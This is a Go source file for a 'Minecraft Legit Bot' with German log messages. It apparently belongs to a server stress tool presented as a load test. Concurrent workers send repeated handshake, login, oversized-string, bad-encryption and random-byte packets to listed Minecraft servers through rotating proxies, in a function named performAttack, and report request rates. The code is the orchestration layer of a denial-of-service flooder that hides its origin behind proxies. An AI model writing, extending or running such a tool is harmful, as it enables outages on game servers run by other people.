package minecraft_legit

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"loadtest/minecraft_legit/methods"
	"loadtest/utils"
	"math/rand"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type ProxyConfig struct {
	Protocol string
	Host     string
	Port     string
	Username string
	Password string
	Type     string
}

type MinecraftLegit struct {
	servers         []string
	proxies         []ProxyConfig
	useRotating     bool
	workers         int
	duration        time.Duration
	methodName      string
	protocolVersion int32
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	errorStats      map[string]int64
	errorMutex      sync.RWMutex
	proxyIndex      int32
	mu              sync.Mutex
}

type Method interface {
	Execute(conn net.Conn, host string, port uint16, protocolVersion int32) error
}

func NewMinecraftLegit(servers []string, proxies []ProxyConfig, useRotating bool, workers int, duration time.Duration, methodName string, protocolVersion int32) *MinecraftLegit {
	if protocolVersion <= 0 {
		protocolVersion = 763 // Default: 1.20.1
	}

	return &MinecraftLegit{
		servers:         servers,
		proxies:         proxies,
		useRotating:     useRotating,
		workers:         workers,
		duration:        duration,
		methodName:      methodName,
		protocolVersion: protocolVersion,
		errorStats:      make(map[string]int64),
	}
}

func (ml *MinecraftLegit) Start(ctx context.Context) error {
	utils.Info("Starte Minecraft Legit Bot...")
	utils.Info("Methode: %s, Protokoll: %d", ml.methodName, ml.protocolVersion)
	utils.Info("Server: %d, Worker: %d, Dauer: %v", len(ml.servers), ml.workers, ml.duration)
	utils.Info("Proxys: %d (Rotation: %v)", len(ml.proxies), ml.useRotating)

	ctx, cancel := context.WithTimeout(ctx, ml.duration)
	defer cancel()

	var wg sync.WaitGroup

	for i := 0; i < ml.workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			ml.worker(ctx, workerID)
		}(i)
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	go ml.printLiveStats(ctx, ticker.C)

	wg.Wait()
	ml.printFinalStats()

	return nil
}

func (ml *MinecraftLegit) worker(ctx context.Context, workerID int) {
	method := ml.getMethod()
	if method == nil {
		utils.Error("Unbekannte Methode: %s", ml.methodName)
		return
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			server := ml.servers[rand.Intn(len(ml.servers))]
			err := ml.performAttack(server, method)

			atomic.AddInt64(&ml.totalRequests, 1)
			if err != nil {
				atomic.AddInt64(&ml.failedRequests, 1)
				ml.recordError(err)
			} else {
				atomic.AddInt64(&ml.successRequests, 1)
			}

			// Kleine Verzögerung zwischen Anfragen
			time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
		}
	}
}

func (ml *MinecraftLegit) getMethod() Method {
	switch ml.methodName {
	case "authentication", "auth":
		return methods.NewAuthenticationRequestMethod()
	case "motd", "real_motd":
		return methods.NewRealMotdRequestMethod()
	case "bigstring", "big_string":
		return methods.NewBigStringMethod(25555)
	case "encryption", "encryption_error":
		return methods.NewEncryptionErrorMethod()
	case "handshake":
		return methods.NewHandshakeMethod(ml.protocolVersion)
	case "login", "login_request":
		return methods.NewLoginRequestMethod()
	case "random", "random_byte":
		return methods.NewRandomByteMethod()
	case "status", "status_request":
		return methods.NewStatusRequestMethod()
	default:
		return nil
	}
}

func (ml *MinecraftLegit) performAttack(server string, method Method) error {
	conn, err := ml.createConnection(server)
	if err != nil {
		return fmt.Errorf("verbindung fehlgeschlagen: %w", err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	parsedServer, err := parseMinecraftServer(server)
	if err != nil {
		return err
	}

	return method.Execute(conn, parsedServer.Host, parsedServer.Port, ml.protocolVersion)
}

func (ml *MinecraftLegit) createConnection(server string) (net.Conn, error) {
	parsedServer, err := parseMinecraftServer(server)
	if err != nil {
		return nil, err
	}

	address := fmt.Sprintf("%s:%d", parsedServer.Host, parsedServer.Port)

	if len(ml.proxies) == 0 {
		return net.DialTimeout("tcp", address, 10*time.Second)
	}

	proxyConfig := ml.selectProxy()
	return ml.dialThroughProxy(proxyConfig, address)
}

func (ml *MinecraftLegit) selectProxy() ProxyConfig {
	if !ml.useRotating || len(ml.proxies) == 1 {
		return ml.proxies[0]
	}

	index := atomic.AddInt32(&ml.proxyIndex, 1)
	return ml.proxies[int(index)%len(ml.proxies)]
}

func (ml *MinecraftLegit) dialThroughProxy(proxyConfig ProxyConfig, target string) (net.Conn, error) {
	proxyAddr := fmt.Sprintf("%s:%s", proxyConfig.Host, proxyConfig.Port)

	switch proxyConfig.Protocol {
	case "socks5", "socks4":
		var auth *proxy.Auth
		if proxyConfig.Username != "" {
			auth = &proxy.Auth{
				User:     proxyConfig.Username,
				Password: proxyConfig.Password,
			}
		}

		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
			Timeout: 10 * time.Second,
		})
		if err != nil {
			return nil, fmt.Errorf("socks proxy fehler: %w", err)
		}

		return dialer.Dial("tcp", target)

	case "http", "https":
		conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("http proxy verbindung fehlgeschlagen: %w", err)
		}

		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("http proxy request fehlgeschlagen: %w", err)
		}

		return conn, nil

	default:
		return nil, fmt.Errorf("nicht unterstütztes proxy-protokoll: %s", proxyConfig.Protocol)
	}
}

func (ml *MinecraftLegit) recordError(err error) {
	ml.errorMutex.Lock()
	defer ml.errorMutex.Unlock()

	errorType := "unknown"
	if err != nil {
		errorType = err.Error()
		if len(errorType) > 50 {
			errorType = errorType[:50]
		}
	}

	ml.errorStats[errorType]++
}

func (ml *MinecraftLegit) printLiveStats(ctx context.Context, ticker <-chan time.Time) {
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker:
			total := atomic.LoadInt64(&ml.totalRequests)
			success := atomic.LoadInt64(&ml.successRequests)
			failed := atomic.LoadInt64(&ml.failedRequests)

			if total > 0 {
				successRate := float64(success) / float64(total) * 100
				rps := float64(total) / time.Since(time.Now().Add(-ml.duration)).Seconds()
				utils.Info("Anfragen: %d | Erfolgreich: %d (%.1f%%) | Fehlgeschlagen: %d | RPS: %.2f",
					total, success, successRate, failed, rps)
			}
		}
	}
}

func (ml *MinecraftLegit) printFinalStats() {
	utils.Info("=== FINALE STATISTIKEN ===")

	total := atomic.LoadInt64(&ml.totalRequests)
	success := atomic.LoadInt64(&ml.successRequests)
	failed := atomic.LoadInt64(&ml.failedRequests)

	if total > 0 {
		successRate := float64(success) / float64(total) * 100
		rps := float64(total) / ml.duration.Seconds()

		utils.Info("Methode: %s", ml.methodName)
		utils.Info("Protokoll-Version: %d", ml.protocolVersion)
		utils.Info("Ziel-Server: %d Server", len(ml.servers))
		utils.Info("Testdauer: %v", ml.duration)
		utils.Info("Gesamt Anfragen: %d", total)
		utils.Info("Erfolgreich: %d (%.2f%%)", success, successRate)
		utils.Info("Fehlgeschlagen: %d", failed)
		utils.Info("Anfragen/Sekunde: %.2f", rps)

		ml.errorMutex.RLock()
		if len(ml.errorStats) > 0 {
			utils.Info("FEHLER-VERTEILUNG:")
			for errorType, count := range ml.errorStats {
				percentage := float64(count) / float64(failed) * 100
				utils.Info("  %s: %d (%.1f%%)", errorType, count, percentage)
			}
		}
		ml.errorMutex.RUnlock()
	}
}

type MinecraftServer struct {
	Host string
	Port uint16
}

func parseMinecraftServer(server string) (MinecraftServer, error) {
	host, portStr, err := net.SplitHostPort(server)
	if err != nil {
		return MinecraftServer{Host: server, Port: 25565}, nil
	}

	port, err := strconv.ParseUint(portStr, 10, 16)
	if err != nil {
		return MinecraftServer{}, fmt.Errorf("ungültiger port: %w", err)
	}

	return MinecraftServer{Host: host, Port: uint16(port)}, nil
}

// Helper-Funktionen für Packet-Erstellung
func createHandshakePacket(host string, port uint16, nextState int32, protocolVersion int32) []byte {
	var buf bytes.Buffer

	writeVarInt(&buf, 0)
	writeVarInt(&buf, protocolVersion)
	writeString(&buf, host)
	binary.Write(&buf, binary.BigEndian, port)
	writeVarInt(&buf, nextState)

	packetData := buf.Bytes()
	var result bytes.Buffer
	writeVarInt(&result, int32(len(packetData)))
	result.Write(packetData)

	return result.Bytes()
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := value & 0x7F
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(byte(temp))
		if value == 0 {
			break
		}
	}
}

func writeString(buf *bytes.Buffer, str string) {
	writeVarInt(buf, int32(len(str)))
	buf.WriteString(str)
}

// Getter-Methoden
func (ml *MinecraftLegit) GetServers() []string {
	return ml.servers
}

func (ml *MinecraftLegit) GetProxies() []ProxyConfig {
	return ml.proxies
}

func (ml *MinecraftLegit) GetWorkers() int {
	return ml.workers
}

func (ml *MinecraftLegit) GetDuration() time.Duration {
	return ml.duration
}

func (ml *MinecraftLegit) GetMethodName() string {
	return ml.methodName
}

func (ml *MinecraftLegit) GetProtocolVersion() int32 {
	return ml.protocolVersion
}

func (ml *MinecraftLegit) GetUseRotating() bool {
	return ml.useRotating
}

func (ml *MinecraftLegit) GetErrorStats() map[string]int64 {
	ml.errorMutex.RLock()
	defer ml.errorMutex.RUnlock()
	stats := make(map[string]int64)
	for k, v := range ml.errorStats {
		stats[k] = v
	}
	return stats
}
